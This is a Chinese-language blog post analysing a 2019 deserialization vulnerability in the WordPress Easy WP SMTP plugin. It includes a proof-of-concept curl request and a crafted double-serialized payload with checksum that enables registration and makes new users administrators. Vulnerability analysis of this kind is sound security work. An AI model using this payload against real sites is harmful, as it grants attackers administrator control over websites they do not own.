---
layout: post
title:  "WordPress Easy WP SMTP反序列化漏洞分析"
date:   2019-03-21 16:31:21 +0800
categories: bug
category: bug
---

<p>
	<span style="color:#DAA520;"><strong>Wordpress插件Easy WP SMTP最近新出了个漏洞，以前有关注过，好像新的代码变化有点大，所以这里花了点时间简单分析下。</strong></span>
</p>

首先，这个漏洞存在于版本v1.3.9。 我这里能下到最接近的老版本是v1.3.8，可惜v1.3.9更迭了一些重要代码，我找到的版本，应该不能复现这个漏洞。
下面我会根据网上一些细节进行分析，没耐心的大佬可以直接跳到最后看原版的分析。

关键函数位置在：
```
wp-content/plugins/easy-wp-smtp/easy-wp-smtp.php::admin_init
```
这里的函数，可以在用户登入admin界面时进行hook，本来是用来查看删除日志，导入/删除/更新数据库里的配置的。

然而他这里没有对用户权限做严格的验证，甚至没有认证过的游客一样可以触发这个漏洞。
/wp-admin/admin.php的注释里对admin_init解释道：
```
Note, this does not just run on user-facing admin screens. It runs on admin-ajax.php and admin-post.php as well.
```

我们这里在admin-ajax.php处，为了触发漏洞，发送了action=swpsmtp_clear_log的ajax交互请求：

网上给出的poc：
```
$ curl https://VICTIM.COM/wp-admin/admin-ajax.php -F 'action=swpsmtp_clear_log' -F 'swpsmtp_import_settings=1' -F 'swpsmtp_import_settings_file=@/tmp/upload.txt'

```

网上的poc是利用函数中的一个导入配置文件的功能：
```
$in_raw = file_get_contents( $_FILES[ 'swpsmtp_import_settings_file' ][ 'tmp_name' ] );
```
在导入以后，他会对文件内容进行一个反序列化解析：
```
$in = unserialize( $in_raw );
```
我们可以使用下面的array:
```
{
  ["users_can_register"]=>
  string(1) "1"
  ["default_role"]=>
  string(13) "administrator"
}
```
序列化以后成为：
```
"a:2:{s:18:"users_can_register";s:1:"1";s:12:"default_role";s:13:"administrator";}"
```
再次组合array：
```
{
  ["data"]=>
  string(81) "a:2:{s:18:"users_can_register";s:1:"1";s:12:"default_role";s:13:"administrator";}"
  ["checksum"]=>
  string(32) "3ce5fb6d7b1dbd6252f4b5b3526650c8"
}

```
第二次序列化后，将下面的结果，存入我们要上传的文件/tmp/upload.txt里：
```
a:2:{s:4:"data";s:81:"a:2:{s:18:"users_can_register";s:1:"1";s:12:"default_role";s:13:"administrator";}";s:8:"checksum";s:32:"3ce5fb6d7b1dbd6252f4b5b3526650c8";}
```

简单说下，为何要这么构造呢，因为我们的插件代码里有这么一段：
```
$in = unserialize( $in_raw );
if ( empty( $in[ 'data' ] ) ) {
	 echo $err_msg;
	 wp_die();
}
if ( empty( $in[ 'checksum' ] ) ) {
	 echo $err_msg;
	 wp_die();
}
if ( md5( $in[ 'data' ] ) !== $in[ 'checksum' ] ) {
	 echo $err_msg;
	 wp_die();
}
```
我们可以看到，需要绕过两个部分：
```
unserialize( $in_raw );
unserialize( $in['data'] )
```
经过两次反序列化的结果后，data的内容，也就是下面的数组：
```
{
  ["users_can_register"]=>
  string(1) "1"
  ["default_role"]=>
  string(13) "administrator"
}
```
才能分拆为key-value，进入后续函数：
```
foreach ( $data as $key => $value ) 
{
	    update_option( $key, $value );
}
```

users_can_register是配置的注册启用选项，default_role是默认普通权限，administrator是管理权限。
到这里就明了了，开启注册后，我们注册的普通用户都是管理权限，没必要去取原来的管理密码，反正也解不出来...


下面我们可以跟到更新数据库配置的位置，这就已经到主branch了：
```
/wp-includes/option.php::update_option
```
我们可以看到，里面的key，value的值经过下面的函数过滤，对序列化和拼接做了限制，再者使用的$wpdb进行sql执行update，可以操作的地方就比较有限了：
```
$value = apply_filters( "pre_update_option_{$option}", $value, $old_value, $option );
$value = apply_filters( 'pre_update_option', $value, $option, $old_value );
	
if ( $value === $old_value || maybe_serialize( $value ) === maybe_serialize( $old_value ) ) 
{
	return false;
}

$result = $wpdb->update( $wpdb->options, $update_args, array( 'option_name' => $option ) );
```
附上数据库wp_options表查询的最初始的默认结果：
![](http://ww1.sinaimg.cn/large/697f6f27ly1g1agtwdr61j210i0dujsn.jpg)

手慢很少写分析漏洞文章，可能略显啰嗦，只是为了给小白解释的清楚些，大佬们见谅。

引用文章：

[Critical zero-day vulnerability fixed in WordPress Easy WP SMTP plugin.](https://blog.nintechnet.com/critical-0day-vulnerability-fixed-in-wordpress-easy-wp-smtp-plugin/)
